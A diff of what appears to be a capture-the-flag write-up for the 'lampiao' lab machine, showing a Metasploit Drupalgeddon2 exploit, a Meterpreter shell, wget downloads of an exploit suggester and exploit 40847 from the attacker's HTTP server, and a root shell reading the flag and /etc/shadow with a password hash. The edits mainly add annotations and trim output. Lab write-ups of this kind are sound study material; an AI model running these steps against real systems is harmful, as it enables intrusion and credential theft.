@@ -184,110 +184,6 @@ msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
 [*] Sending stage (39927 bytes) to 192.168.100.129
 [*] Meterpreter session 1 opened (192.168.100.128:4444 -> 192.168.100.129:47862) at 2023-12-10 02:37:33 -0500
 
-meterpreter > help
-
-Core Commands
-=============
-
-    Command       Description
-    -------       -----------
-    ?             Help menu
-    background    Backgrounds the current session
-    bg            Alias for background
-    bgkill        Kills a background meterpreter script
-    bglist        Lists running background scripts
-    bgrun         Executes a meterpreter script as a background thread
-    channel       Displays information or control active channels
-    close         Closes a channel
-    detach        Detach the meterpreter session (for http/https)
-    disable_unic  Disables encoding of unicode strings
-    ode_encoding
-    enable_unico  Enables encoding of unicode strings
-    de_encoding
-    exit          Terminate the meterpreter session
-    guid          Get the session GUID
-    help          Help menu
-    info          Displays information about a Post module
-    irb           Open an interactive Ruby shell on the current session
-    load          Load one or more meterpreter extensions
-    machine_id    Get the MSF ID of the machine attached to the session
-    pry           Open the Pry debugger on the current session
-    quit          Terminate the meterpreter session
-    read          Reads data from a channel
-    resource      Run the commands stored in a file
-    run           Executes a meterpreter script or Post module
-    secure        (Re)Negotiate TLV packet encryption on the session
-    sessions      Quickly switch to another session
-    use           Deprecated alias for "load"
-    uuid          Get the UUID for the current session
-    write         Writes data to a channel
-
-
-Stdapi: File system Commands
-============================
-
-    Command       Description
-    -------       -----------
-    cat           Read the contents of a file to the screen
-    cd            Change directory
-    checksum      Retrieve the checksum of a file
-    chmod         Change the permissions of a file
-    cp            Copy source to destination
-    del           Delete the specified file
-    dir           List files (alias for ls)
-    download      Download a file or directory
-    edit          Edit a file
-    getlwd        Print local working directory
-    getwd         Print working directory
-    lcat          Read the contents of a local file to the screen
-    lcd           Change local working directory
-    lls           List local files
-    lmkdir        Create new directory on local machine
-    lpwd          Print local working directory
-    ls            List files
-    mkdir         Make directory
-    mv            Move source to destination
-    pwd           Print working directory
-    rm            Delete the specified file
-    rmdir         Remove directory
-    search        Search for files
-    upload        Upload a file or directory
-
-
-Stdapi: Networking Commands
-===========================
-
-    Command       Description
-    -------       -----------
-    portfwd       Forward a local port to a remote service
-    resolve       Resolve a set of host names on the target
-
-
-Stdapi: System Commands
-=======================
-
-    Command       Description
-    -------       -----------
-    execute       Execute a command
-    getenv        Get one or more environment variable values
-    getpid        Get the current process identifier
-    getuid        Get the user that the server is running as
-    kill          Terminate a process
-    localtime     Displays the target system local date and time
-    pgrep         Filter processes by name
-    pkill         Terminate processes by name
-    ps            List running processes
-    shell         Drop into a system command shell
-    sysinfo       Gets information about the remote system, such as OS
-
-
-Stdapi: Audio Output Commands
-=============================
-
-    Command       Description
-    -------       -----------
-    play          play a waveform audio file (.wav) on the target system
-
 meterpreter > getuid
 Server username: www-data
 meterpreter > shell
@@ -300,15 +196,8 @@ Process 21123 created.
 Channel 1 created.
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-python -c 'import pty; pty,spawn("/bin/bash")
-id
-python -c 'import pty; pty.spawn("/bin/bash")'
-/bin/sh: 4: Syntax error: word unexpected (expecting ")")
-[-] core_channel_interact: Operation failed: 1
 meterpreter > getuid
 Server username: www-data
-meterpreter > python -c 'import pty; pty.spawn("/bin/bash")'
-[-] Unknown command: python
 meterpreter > shell
 Process 21235 created.
 Channel 2 created.
@@ -322,13 +211,20 @@ uname -a
 Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 www-data@lampiao:/var/www/html$ cd /
 cd /
-www-data@lampiao:/$ cd
-cd
-bash: cd: HOME not set
 www-data@lampiao:/$ cd /tmp
 cd /tmp
 www-data@lampiao:/tmp$ ls
 ls
+~~~
+Setup python web file Transfer
+~~~
+┌──(alpha㉿Sploit)-[~/transfer]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.100.129 - - [10/Dec/2023 02:42:59] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
+~~~
+Download exploit suggester
+~~~
 www-data@lampiao:/tmp$ wget http://192.168.100.128/linux-exploit-suggester.sh
 wget http://192.168.100.128/linux-exploit-suggester.sh
 --2023-12-09 18:43:09--  http://192.168.100.128/linux-exploit-suggester.sh
@@ -344,6 +240,9 @@ Saving to: 'linux-exploit-suggester.sh'
 www-data@lampiao:/tmp$ ls
 ls
 linux-exploit-suggester.sh
+~~~
+Give permission
+~~~
 www-data@lampiao:/tmp$ chmod +x linux-exploit-suggester.sh
 chmod +x linux-exploit-suggester.sh
 www-data@lampiao:/tmp$ ls
@@ -497,28 +396,10 @@ gcc version
 gcc: error: version: No such file or directory
 gcc: fatal error: no input files
 compilation terminated.
-www-data@lampiao:/tmp$ gcc
-gcc
-gcc: fatal error: no input files
-compilation terminated.
-www-data@lampiao:/tmp$ wget http://192.168.100.128/40847
-wget http://192.168.100.128/40847
---2023-12-09 18:45:49--  http://192.168.100.128/40847
-Connecting to 192.168.100.128:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 10531 (10K) [application/octet-stream]
-Saving to: '40847'
-
-100%[======================================>] 10,531      --.-K/s   in 0s      
-
-2023-12-09 18:45:49 (193 MB/s) - '40847' saved [10531/10531]
-
-www-data@lampiao:/tmp$ ls
-ls
-40847  linux-exploit-suggester.sh
-www-data@lampiao:/tmp$ ./40847
-./40847
-bash: ./40847: Permission denied
+~~~
+![](exploit.png)
+https://www.exploit-db.com/exploits/40847
+~~~
 www-data@lampiao:/tmp$ wget http://192.168.100.128/40847.cpp
 wget http://192.168.100.128/40847.cpp
 --2023-12-09 18:46:27--  http://192.168.100.128/40847.cpp
@@ -556,6 +437,9 @@ root@lampiao:~# cat flag.txt
 cat flag.txt
 9740616875908d91ddcdaa8aea3af366
 root@lampiao:~# cat /etc/shadow
+~~~
+Some fun scripts
+~~~
 cat /etc/shadow
 root:$6$9ErXhqpG$SmL.dOTKiOuHdkLiwoFA7rQu6lNeoVw/QoJZTZlmAqCHFYM9pcv3trm5j0bTnTTjo9YLkbmSYk6T1dBKko/KS0:17641:0:99999:7:::
 daemon:*:17016:0:99999:7:::
